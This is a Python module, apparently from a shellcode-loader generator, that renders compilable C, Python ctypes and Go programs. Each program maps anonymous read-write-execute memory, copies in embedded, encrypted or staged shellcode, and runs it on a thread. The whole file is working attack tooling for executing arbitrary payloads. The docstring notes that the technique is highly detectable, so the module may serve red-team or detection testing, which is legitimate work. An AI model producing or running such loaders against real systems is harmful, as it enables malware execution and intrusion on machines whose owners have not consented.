"""Loader: linux_mmap_rwx — mmap(PROT_RWX, MAP_ANON|MAP_PRIVATE) → memcpy → pthread_create.

Tier 1 Linux baseline. Maximum visibility.
  - PROT_EXEC on an anonymous private mapping is the strongest memory-based
    indicator on Linux; flagged by seccomp, eBPF LSM, and most security tools
  - pthread_create from an anonymous executable region is also monitored

Compile: gcc -o loader loader.c -lpthread
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "linux_mmap_rwx")

# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
# {sc_init}     — in-main init block (decrypt loop or file-reading code)
# {main_decl}   — main() signature (void or int argc, char *argv[])
_C_TEMPLATE = """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>

{sc_embed}

static void *run(void *arg) {{
    ((void (*)(void))arg)();
    return NULL;
}}

{main_decl} {{
    {sc_init}
    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    pthread_t tid;
    if (pthread_create(&tid, NULL, run, mem) != 0) {{
        perror("pthread_create");
        munmap(mem, sc_len);
        return 1;
    }}
    pthread_join(tid, NULL);
    munmap(mem, sc_len);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import ctypes.util
import sys

{sc_bytes}

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libpthread = ctypes.CDLL(ctypes.util.find_library("pthread"), use_errno=True)

PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4
MAP_PRIVATE   = 0x02
MAP_ANONYMOUS = 0x20

libc.mmap.restype = ctypes.c_void_p
mem = libc.mmap(None, len(sc),
                PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS,
                -1, 0)
if mem == ctypes.c_void_p(-1).value:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
libc.memcpy(ctypes.c_void_p(mem), buf, len(sc))

THREAD_FUNC = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
def _run(arg):
    ctypes.CFUNCTYPE(None)(arg)()
    return None

tid = ctypes.c_ulong(0)
cb = THREAD_FUNC(_run)
libpthread.pthread_create(ctypes.byref(tid), None, cb, ctypes.c_void_p(mem))
libpthread.pthread_join(tid, None)
"""


# {sc_embed}    — package-level declarations (or empty for staged)
# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
_GO_TEMPLATE = """\
//go:build linux

package main

import (
\t"runtime"
\t"syscall"
\t"unsafe"{sc_imports}
)

{sc_embed}

func main() {{
\t{sc_init}
\tmem, err := syscall.Mmap(-1, 0, len(sc),
\t\tsyscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
\t\tsyscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
\tif err != nil {{
\t\treturn
\t}}
\tcopy(mem, sc)

\tdone := make(chan struct{{}})
\tgo func() {{
\t\tdefer close(done)
\t\truntime.LockOSThread()
\t\tfuncval := [1]uintptr{{uintptr(unsafe.Pointer(&mem[0]))}}
\t\tf := *(*func())(unsafe.Pointer(&funcval))
\t\tf()
\t}}()
\t<-done
\tsyscall.Munmap(mem)
}}
"""


def generate_c(shellcode: bytes, staged: bool = False) -> str:
    """Return a compilable C loader using mmap(RWX) + pthread_create."""
    if staged:
        embed, init = _render.c_staged_sc("sc")
        main_decl = "int main(int argc, char *argv[])"
    else:
        embed, init = _render.c_sc_block(shellcode, "sc")
        main_decl = "int main(void)"
    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)


def generate_python(shellcode: bytes, staged: bool = False) -> str:
    """Return a Python ctypes loader using mmap(RWX) + pthread_create."""
    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)


def generate_go(shellcode: bytes, staged: bool = False) -> str:
    """Return a Go loader using mmap(RWX) + goroutine on a locked OS thread."""
    if staged:
        embed, init, imports = _render.go_staged_sc("sc")
    else:
        embed, init, imports = _render.go_sc_block(shellcode, "sc")
    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)
